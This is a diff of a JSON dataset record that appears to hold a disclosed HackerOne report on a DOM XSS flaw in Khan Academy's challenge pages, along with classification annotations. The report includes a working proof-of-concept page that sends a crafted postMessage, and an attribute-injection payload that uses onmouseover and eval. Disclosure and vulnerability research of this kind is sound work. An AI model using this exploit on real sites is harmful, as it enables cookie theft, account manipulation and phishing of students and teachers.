@@ -1,45 +1,46 @@
 {
-    "reported_to": "Khan Academy",
-    "reported_by": "moom825 ",
-    "title": "xss due to incorrect handling of postmessages",
-    "content": "\nDue to Insecure handling of create link tags (a tags) in a function called autolink found in 7Bmt.af733e428f9f986dfc96.js\nCode 661 Bytes\n1e = n.autolink(e, !0));\n2        const n = function() {\n3            const e = /\\b(?:(?:https?:\\/\\/|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}\\/)(?:[^\\s()<>&]+|&amp;|\\((?:[^\\s()<>]|(?:\\([^\\s()<>]+\\)))*\\))+(?:\\((?:[^\\s()<>]|(?:\\([^\\s()<>]+\\)))*\\)|[^\\s`!()\\[\\]{};:'\".,<>?\u00ab\u00bb\u201c\u201d\u2018\u2019&]))/gi;\n4            return {\n5                autolink: function(t, r) {\n6                    return t.replace(e, (function(e) {\n7                        /^https?:\\/\\//.test(e) || (e = \"http://\" + e);\n8                        return \"<a \" + (r ? 'rel=\"nofollow\"' : \"\") + ' href=\"' + e + '\">' + e + \"</a>\"\n9                    }\n10                    ))\n11                }\n12            }\n13        }();\nwhich is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.\nCode 983 Bytes\n1<!DOCTYPE html>\n2<html>\n3    <head>\n4        <meta charset=\"utf-8\">\n5        <title>New webpage</title>\n6    </head>\n7    <body>\n8        <script>\n9        function main()\n10{\n11\twindow['test']=window.open(\"https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania\");\n12\tconst pwntimer = setTimeout(pwn, 3000);\t\n13}\n14function pwn(){window['test'].postMessage('{\"results\":{\"timestamp\":'+Date.now()+',\"code\":\"\",\"errors\":[],\"assertions\":[],\"warnings\":[],\"tests\":[{\"name\":\"\",\"state\":\"pass\",\"results\":[{\"type\":\"assertion\",\"msg\":\"http://#/\\\\\"style=\\\\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\\\\"onmouseover=\\\\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\\\\"\",\"state\":\"pass\",\"expected\":\"\",\"meta\":{\"structure\":\"function() {pwned!}\"}}]}]}}',\"*\");clearTimeout(pwntimer)};\n15        </script>\n16        <button onclick=\"main();\">press to pwn</button>\n17    </body>\n18</html>\nalso due to insecure host checking in the message event, the mentioned html code above can be run from any webpage.\nThe payload which the function autolink is insecurely creating the tag can look like this\nhttp://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\" the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)\nthe parsed json payload:\nCode 779 Bytes\n1{\n2   \"results\":{\n3      \"timestamp\":\"\",\n4      \"code\":\"\",\n5      \"errors\":[\n6         \n7      ],\n8      \"assertions\":[\n9         \n10      ],\n11      \"warnings\":[\n12         \n13      ],\n14      \"tests\":[\n15         {\n16            \"name\":\"\",\n17            \"state\":\"pass\",\n18            \"results\":[\n19               {\n20                  \"type\":\"assertion\",\n21                  \"msg\":\"http://#/\\\"style=\\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\\"onmouseover=\\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\\"\",\n22                  \"state\":\"pass\",\n23                  \"expected\":\"\",\n24                  \"meta\":{\n25                     \"structure\":\"function() {pwned!}\"\n26                  }\n27               }\n28            ]\n29         }\n30      ]\n31   }\n32}\nImpact\nThis attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email (\"106 assignments have been assigned\") as well as leak student private info. This attack could also be used to create a phishing page with the domain khanacademy.org by modifying the page to display a login box (stealing the users email and password).\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "Khan Academy",
+  "reported_by": "moom825 ",
+  "title": "xss due to incorrect handling of postmessages",
+  "content": "\nDue to Insecure handling of create link tags (a tags) in a function called autolink found in 7Bmt.af733e428f9f986dfc96.js\nCode 661 Bytes\n1e = n.autolink(e, !0));\n2        const n = function() {\n3            const e = /\\b(?:(?:https?:\\/\\/|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}\\/)(?:[^\\s()<>&]+|&amp;|\\((?:[^\\s()<>]|(?:\\([^\\s()<>]+\\)))*\\))+(?:\\((?:[^\\s()<>]|(?:\\([^\\s()<>]+\\)))*\\)|[^\\s`!()\\[\\]{};:'\".,<>?\u00ab\u00bb\u201c\u201d\u2018\u2019&]))/gi;\n4            return {\n5                autolink: function(t, r) {\n6                    return t.replace(e, (function(e) {\n7                        /^https?:\\/\\//.test(e) || (e = \"http://\" + e);\n8                        return \"<a \" + (r ? 'rel=\"nofollow\"' : \"\") + ' href=\"' + e + '\">' + e + \"</a>\"\n9                    }\n10                    ))\n11                }\n12            }\n13        }();\nwhich is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.\nCode 983 Bytes\n1<!DOCTYPE html>\n2<html>\n3    <head>\n4        <meta charset=\"utf-8\">\n5        <title>New webpage</title>\n6    </head>\n7    <body>\n8        <script>\n9        function main()\n10{\n11\twindow['test']=window.open(\"https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania\");\n12\tconst pwntimer = setTimeout(pwn, 3000);\t\n13}\n14function pwn(){window['test'].postMessage('{\"results\":{\"timestamp\":'+Date.now()+',\"code\":\"\",\"errors\":[],\"assertions\":[],\"warnings\":[],\"tests\":[{\"name\":\"\",\"state\":\"pass\",\"results\":[{\"type\":\"assertion\",\"msg\":\"http://#/\\\\\"style=\\\\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\\\\"onmouseover=\\\\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\\\\"\",\"state\":\"pass\",\"expected\":\"\",\"meta\":{\"structure\":\"function() {pwned!}\"}}]}]}}',\"*\");clearTimeout(pwntimer)};\n15        </script>\n16        <button onclick=\"main();\">press to pwn</button>\n17    </body>\n18</html>\nalso due to insecure host checking in the message event, the mentioned html code above can be run from any webpage.\nThe payload which the function autolink is insecurely creating the tag can look like this\nhttp://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\" the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)\nthe parsed json payload:\nCode 779 Bytes\n1{\n2   \"results\":{\n3      \"timestamp\":\"\",\n4      \"code\":\"\",\n5      \"errors\":[\n6         \n7      ],\n8      \"assertions\":[\n9         \n10      ],\n11      \"warnings\":[\n12         \n13      ],\n14      \"tests\":[\n15         {\n16            \"name\":\"\",\n17            \"state\":\"pass\",\n18            \"results\":[\n19               {\n20                  \"type\":\"assertion\",\n21                  \"msg\":\"http://#/\\\"style=\\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\\"onmouseover=\\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\\"\",\n22                  \"state\":\"pass\",\n23                  \"expected\":\"\",\n24                  \"meta\":{\n25                     \"structure\":\"function() {pwned!}\"\n26                  }\n27               }\n28            ]\n29         }\n30      ]\n31   }\n32}\nImpact\nThis attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email (\"106 assignments have been assigned\") as well as leak student private info. This attack could also be used to create a phishing page with the domain khanacademy.org by modifying the page to display a login box (stealing the users email and password).\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - DOM"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1671772920,
+  "report_url": "https://hackerone.com/reports/1758132",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create an HTML file with a script that opens a Khan Academy challenge page in a new window and sends a specially crafted postMessage payload after a delay."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - DOM"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1671772920,
-    "report_url": "https://hackerone.com/reports/1758132",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Create an HTML file with a script that opens a Khan Academy challenge page in a new window and sends a specially crafted postMessage payload after a delay."
-        ],
-        [
-            2,
-            "The payload includes a malicious URL that exploits the autolink function to inject arbitrary HTML attributes into an anchor tag, including event handlers like onmouseover."
-        ]
-    ],
-    "vuln_description": "The vulnerability is a DOM-based XSS caused by insecure handling of postMessages and improper URL sanitization in the autolink function. The function creates anchor tags from URLs without properly escaping or validating the input, allowing injection of arbitrary HTML attributes including JavaScript event handlers.",
-    "reason": "This vulnerability requires understanding of multiple components: the postMessage API, the autolink function's behavior, and how to craft a payload that bypasses URL parsing while still executing JavaScript. The interaction between postMessage handling and DOM manipulation is non-obvious, and the attack requires precise timing and payload construction.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves insecure handling of postMessages and autolink functionality within the same application context. The methodology described involves testing actions with different user sessions and resource IDs within the same application, which would include testing the autolink function with malicious input. Since the attack vector is within the same application and involves manipulating the autolink function's output, it falls under the scope of the described methodology.",
-        "is_detectable": true
-    }
+    [
+      2,
+      "The payload includes a malicious URL that exploits the autolink function to inject arbitrary HTML attributes into an anchor tag, including event handlers like onmouseover."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a DOM-based XSS caused by insecure handling of postMessages and improper URL sanitization in the autolink function. The function creates anchor tags from URLs without properly escaping or validating the input, allowing injection of arbitrary HTML attributes including JavaScript event handlers.",
+  "reason": "This vulnerability requires understanding of multiple components: the postMessage API, the autolink function's behavior, and how to craft a payload that bypasses URL parsing while still executing JavaScript. The interaction between postMessage handling and DOM manipulation is non-obvious, and the attack requires precise timing and payload construction.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "reasoning": "The vulnerability involves XSS via postMessage handling and a crafted URL payload exploiting the autolink function. The methodology focuses on HTTP request/response analysis and simple payloads injected into identified parameters. However, this vulnerability requires:\n1. Interaction with postMessage (a client-side API, not directly tied to HTTP parameters)\n2. Context-aware payloads with specific attribute escaping (e.g., `http://#/\\\"style=...`)\n3. Cross-window communication not detectable through regular HTTP logging\n4. Execution trigger via mouseover (not a same-channel response observation)\nThese aspects fall outside the methodology's scope of HTTP-based parameter injection and simple payload testing.",
+    "is_simple_injection": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves insecure handling of postMessages and incorrect URL parsing in the autolink function, which is a client-side DOM-based XSS issue. The proposed methodologies focus on server-side AuthN/AuthZ issues by testing different user sessions and resource IDs, not client-side XSS vulnerabilities resulting from improper input sanitization and DOM manipulation.",
+    "is_detectable": false
+  }
 }
